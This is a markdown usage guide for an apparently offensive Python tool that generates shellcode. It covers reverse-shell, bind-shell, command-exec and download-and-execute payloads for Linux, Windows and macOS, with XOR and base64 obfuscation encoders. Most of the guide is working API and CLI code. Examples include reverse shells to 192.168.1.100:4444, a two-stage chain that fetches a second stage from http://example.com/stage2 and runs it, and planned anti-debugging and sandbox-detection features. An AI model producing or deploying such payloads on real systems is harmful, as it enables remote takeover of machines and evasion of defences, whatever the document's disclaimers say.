# Shellcode Generator Guide

## 📋 Overview

The Shellcode Generator provides educational shellcode generation capabilities for research and learning purposes. It supports multiple platforms and payload types with encoder support.

**⚠️ IMPORTANT:** This tool is for educational purposes only. Only use on systems you own or have explicit permission to test.

## 🎯 Features

### Platform Support

- **Linux x64**: ELF-based payloads
- **Windows x64**: PE-based payloads  
- **macOS x64**: Mach-O-based payloads

### Payload Types

| Payload Type | Description | Platforms |
|--------------|-------------|-----------|
| `reverse-shell` | Connects back to attacker | All |
| `bind-shell` | Binds to local port | All |
| `exec` | Executes arbitrary command | All |
| `download-exec` | Downloads and executes file | Linux |

### Encoders

| Encoder | Description | Key Required |
|---------|-------------|--------------|
| `xor` | XOR obfuscation | Yes (single/multi-byte) |
| `base64` | Base64 encoding | No |

## 🚀 Usage

### Basic Usage

```python
from security_assistant.offensive.shellcode.generator import ShellcodeGenerator

# Initialize generator
gen = ShellcodeGenerator(platform="linux-x64")

# Generate reverse shell
shellcode = gen.generate(
    payload_type="reverse-shell",
    lhost="192.168.1.100",
    lport=4444
)

print(f"Generated {len(shellcode)} bytes of shellcode")
```

### Educational Mode

```python
# Enable educational mode (safe for learning)
gen = ShellcodeGenerator(platform="linux-x64", educational=True)

# Returns commented/hex version instead of raw shellcode
safe_shellcode = gen.generate(
    payload_type="reverse-shell",
    lhost="127.0.0.1",
    lport=4444
)

print(safe_shellcode.decode())
```

### Using Encoders

```python
from security_assistant.offensive.shellcode.encoders.xor import XOREncoder

# Create encoder
encoder = XOREncoder(key=0xAA)

# Generate with encoder
gen = ShellcodeGenerator(platform="linux-x64")
shellcode = gen.generate(
    payload_type="exec",
    cmd="echo 'Hello World'",
    encoder=encoder
)

print(f"Encoded shellcode: {shellcode}")
```

### Multiple Encoders

```python
from security_assistant.offensive.shellcode.encoders.xor import XOREncoder
from security_assistant.offensive.shellcode.encoders.base64 import Base64Encoder

# Chain multiple encoders
xor_encoder = XOREncoder(key=0x55)
base64_encoder = Base64Encoder()

gen = ShellcodeGenerator(platform="windows-x64")
shellcode = gen.generate(
    payload_type="exec",
    cmd="calc.exe",
    encoder=[xor_encoder, base64_encoder]
)
```

## 🔧 Platform-Specific Examples

### Linux x64

```python
from security_assistant.offensive.shellcode.generator import ShellcodeGenerator

# Reverse shell
gen = ShellcodeGenerator(platform="linux-x64")
shellcode = gen.generate(
    payload_type="reverse-shell",
    lhost="192.168.1.100",
    lport=4444
)

# Bind shell
shellcode = gen.generate(
    payload_type="bind-shell",
    lport=8080
)

# Execute command
shellcode = gen.generate(
    payload_type="exec",
    cmd="/bin/bash -c 'echo Hello'"
)
```

### Windows x64

```python
# Reverse shell
gen = ShellcodeGenerator(platform="windows-x64")
shellcode = gen.generate(
    payload_type="reverse-shell",
    lhost="192.168.1.100",
    lport=4444
)

# Execute command
shellcode = gen.generate(
    payload_type="exec",
    cmd="calc.exe"
)
```

### macOS x64

```python
# Reverse shell
gen = ShellcodeGenerator(platform="macos-x64")
shellcode = gen.generate(
    payload_type="reverse-shell",
    lhost="192.168.1.100",
    lport=4444
)

# Execute command
shellcode = gen.generate(
    payload_type="exec",
    cmd="say hello"
)
```

## 🛡️ Safety Features

### Authorization

All shellcode generation requires ToS acceptance:

```python
from security_assistant.offensive.authorization import AuthorizationService

# Accept ToS before generating shellcode
auth = AuthorizationService()
auth.accept_tos(accepted_by="user", version="1.0")

# Now shellcode generation is allowed
gen = ShellcodeGenerator(platform="linux-x64")
```

### Audit Logging

All generation attempts are logged:

```python
# Logs include:
# - Platform
# - Payload type
# - Timestamp
# - User information
# - Educational mode status
```

### Educational Mode

Always use educational mode for learning:

```python
# Educational mode returns safe versions
gen = ShellcodeGenerator(platform="linux-x64", educational=True)
shellcode = gen.generate(payload_type="reverse-shell")

# Returns:
# # EDUCATIONAL MODE - SAFE FOR LEARNING
# # This shellcode is for educational purposes only
# # DO NOT USE FOR MALICIOUS PURPOSES
# \x90\x90\x90... (hex representation)
```

## 📚 Encoder Usage

### XOR Encoder

```python
from security_assistant.offensive.shellcode.encoders.xor import XOREncoder

# Single byte key
encoder = XOREncoder(key=0xAA)
original = b"\x90\x90\x90\x90"
encoded = encoder.encode(original)
decoded = encoder.decode(encoded)

print(f"Original: {original}")
print(f"Encoded: {encoded}")
print(f"Decoded: {decoded}")
print(f"Match: {original == decoded}")

# Multi-byte key
encoder = XOREncoder(key=b"\xAA\xBB\xCC")
```

### Base64 Encoder

```python
from security_assistant.offensive.shellcode.encoders.base64 import Base64Encoder

encoder = Base64Encoder()
original = b"test shellcode"
encoded = encoder.encode(original)
decoded = encoder.decode(encoded)

print(f"Original: {original}")
print(f"Encoded: {encoded}")
print(f"Decoded: {decoded}")
```

## 🧪 Testing

Run tests to verify functionality:

```bash
# Run all shellcode tests
pytest tests/offensive/test_shellcode_generator.py -v

# Check coverage
pytest tests/offensive/test_shellcode_generator.py --cov=security_assistant/offensive/shellcode --cov-report=html
```

## ⚠️ Legal Disclaimer

**IMPORTANT LEGAL NOTICE:**

This software is provided for **educational and research purposes only**. The shellcode generator is designed to help security professionals understand how malware works and to develop defensive techniques.

**Unauthorized use is illegal and unethical.** You must:

1. Only use on systems you own
2. Have explicit written permission for any testing
3. Comply with all applicable laws and regulations
4. Never use for malicious purposes

The authors are not responsible for any misuse of this software. By using this tool, you agree to use it only for lawful, ethical purposes.

## 📖 Resources

- [Shellcode Tutorials](https://www.exploit-db.com/docs/english/13408-shellcode-tutorial.pdf)
- [Linux Syscall Reference](https://syscalls.kernelgrok.com/)
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)
- [macOS Syscall Reference](https://opensource.apple.com/)

## 🔗 Integration

### CLI Integration

```bash
# Generate reverse shell for Linux
security-assistant shellcode-gen \
  --platform linux-x64 \
  --payload reverse-shell \
  --lhost 192.168.1.100 \
  --lport 4444

# Generate with encoder
security-assistant shellcode-gen \
  --platform windows \
  --payload exec \
  --cmd "calc.exe" \
  --encoder xor \
  --key 0xAA
```

### Python API

```python
from security_assistant.offensive.shellcode import ShellcodeGenerator

# Get available platforms and payloads
gen = ShellcodeGenerator(platform="linux-x64")
print("Available payloads:", gen.get_available_payloads())
print("Platform info:", gen.get_platform_info())
```

## 🛠️ Advanced Usage

### Custom Encoders

Create custom encoders by implementing the encoder interface:

```python
class CustomEncoder:
    def encode(self, data: bytes) -> bytes:
        # Your encoding logic
        return encoded_data
    
    def decode(self, data: bytes) -> bytes:
        # Your decoding logic
        return decoded_data

# Use custom encoder
custom_encoder = CustomEncoder()
gen = ShellcodeGenerator(platform="linux-x64")
shellcode = gen.generate(
    payload_type="reverse-shell",
    encoder=custom_encoder
)
```

### Payload Chaining

Chain multiple payloads for complex scenarios:

```python
# Generate multiple payloads
gen = ShellcodeGenerator(platform="linux-x64")

# Stage 1: Download payload
stage1 = gen.generate(
    payload_type="download-exec",
    url="http://example.com/stage2",
    output_path="/tmp/stage2"
)

# Stage 2: Reverse shell
stage2 = gen.generate(
    payload_type="reverse-shell",
    lhost="192.168.1.100",
    lport=4444
)
```

## 📊 Performance Notes

- Shellcode generation is fast (<10ms per payload)
- Encoders add minimal overhead
- Educational mode has slight performance impact due to hex conversion
- Memory usage is low (<1MB for typical payloads)

## 🐛 Troubleshooting

### Common Issues

**Error: "Must accept ToS"**
```bash
# Accept Terms of Service first
security-assistant auth accept-tos
```

**Error: "Unsupported platform"**
```bash
# Use supported platforms: linux-x64, windows-x64, macos-x64
security-assistant shellcode-gen --platform linux-x64
```

**Error: "Unsupported payload type"**
```bash
# Check available payloads for your platform
security-assistant shellcode-gen --list-payloads
```

## 📈 Future Enhancements

Planned features for future releases:

- Custom encoder framework
- Polymorphic shellcode generation
- Anti-debugging techniques
- Sandbox detection
- Additional platform support (ARM, etc.)
- More payload types
- Better error handling and validation

## 🤝 Contributing

Contributions are welcome! Please follow:

1. Write tests first (TDD approach)
2. Maintain 90%+ code coverage
3. Add type hints
4. Include documentation
5. Follow existing code patterns

## 📝 Changelog

See [CHANGELOG.md](/CHANGELOG.md) for version history and updates.
